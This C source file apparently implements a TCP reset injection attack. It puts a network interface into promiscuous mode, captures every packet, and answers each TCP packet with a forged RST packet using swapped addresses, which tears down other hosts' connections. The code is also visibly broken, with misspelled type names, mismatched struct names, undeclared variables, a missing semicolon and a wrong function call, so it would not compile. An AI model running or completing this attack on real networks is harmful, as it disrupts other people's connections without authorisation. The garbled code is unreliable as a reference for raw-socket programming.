#include <stdio.h>
#include <sys/socket.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h> //prob unnecessary
#include <linux/if_ether.h>  
//#include <netinet/if_ether.h> //MacOS
#include <unistd.h>  
#include <stdlib.h>


struct pseudoheader{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;

}

unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void handlePacket(char *buf, int s){
    struct iphdr *ip = (struct iphdr*)(buf + sizeof(struct ethhdr));
    if(ip->protocol == 6){
        unsigned short hdrlen;
        hdrlen = ip->ihl * 4;

        struct tcphdr *tcph = (struct tcphdr*)(buf + hdrlen + sizeof(struct ethhdr));

        int seq_num = tcph->seq;

        int sock;

        if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
            perror("Failed to Create Socket");
            exit(4);
        }

        char datagram[4096], *pseudogram;
        memset(datagram, 0, 4096);

        struct iphdr *ret = (struct iphdr*) datagram;
        
        struct tcphdr *spoof = (struct tchhdr*) (datagram + sizeof(stuct ip));
        struct sockaddr_in sin;
        struct pseudo_header psh;

        sin.sin_family = AF_INET;
        sin.sin_port = htons(spoof->dest); //might be incorrect 
        sin.sin_addr.s_addr = ip->daddr;

        ret->ihl = 5;
        ret->version = 4;
        ret->tos = 0;
        ret->tot_len = sizeof(strcut iphdr) + sizeof(struct tcphdr);
        ret->id = htonl(28313); //prob doesn't matter
        ret->frag_off = 0;
        ret->ttl = 255; //max
        ret->protocol = IPPROTO_TCP;
        ret->check = 0;
        ret->saddr = ip->daddr;
        ret->daddr = ip->saddr;
        ret->check = csum((unsigned short*) datagram, ret->tot_len);

        spoof->dest = tcph->source;
        spoof->source = tcph->dest;
        spoof->seq = tcph->ack;
        spoof->doff = 5;
        spoof->fin = 0;
        spoof->syn = 0;
        spoof->rst = 1;
        spoof->psh = 0;
        spoof->ack = 0;
        spoof->urg = 0;
        spoof->window = htons(5840);
        spoof->check = 0;
        spoof->urg_ptr = 0;

        struct pseudoheader psh;
        psh.source_address = tcph->source;
        psh.dest_address = tchp->dest;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        int psize = sizeof(struct pseudoheader) + sizeof(struct tcphdr);
        pseudogram = malloc(psize); 

        memcpy(pseudogram, (char*) &psh, sizeof(struct pseudoheader));
        memccpy(pseudogram + sizeof(struct pseudoheader), spoof, sizeof(struct tcphdr));

        spoof->check = csum((unsigned short*) pseudogram, psize);

        int one = 1;
        const int *val = &one;

        if (setsockopt(sock, IPPROTO_TCP, IP_HDRINCL, val, sizeof(one)) < 0){
            return -1;
        }

        //Send the packet
		if (sendto (sock, datagram, ret->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		{
			perror("sendto failed");
		}
		//Data send successfully
		else
		{
			printf ("Packet Send. Length : %d \n" , iph->tot_len);
		}
        // sleep for 1 seconds
        sleep(1);
    


    }
}

int main(){
    struct sockaddr addr;
    int sock;
    unsigned char *buffer = malloc(65536);
    char *eth_name = "";

    struct ifreq ethreq;
 
    if((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) < 0)){
        perror("Socket Creation Failed");
        return 1;
    }

    strncpy(ethreq.ifr_name, eth_name, IFNAMSIZ); //creates a control stucture that will be used to enable prom. mode
    if(ioctl(sock, SIOCGIFFLAGS, &ethreq) == -1){ //copies flags into ethreq
        perror("Could not get flags");
        close(sock);
        return 2;
    }

    ethreq.ifr_flags |= IFF_PROMISC; //enable promiscuous flag
    if (ioctl(sock, SIOCSIFFLAGS, &ethreq) == -1){ //set flags
        perror("Could not set flags");
        close(sock);
        return 3;
    }

    int n;

    while (1) {
        n = recvfrom(sock, buffer, 65536, 0, NULL, NULL);
        if(!(n < 0)){
            handlePacket(buffer, n);
        }
    }
    
    ethreq.ifr_flags ^= IFF_PROMISC;
    ioctl(sock, SIOCSIFFLAGS, &ethreq);
    close(sock);
    return 0;






}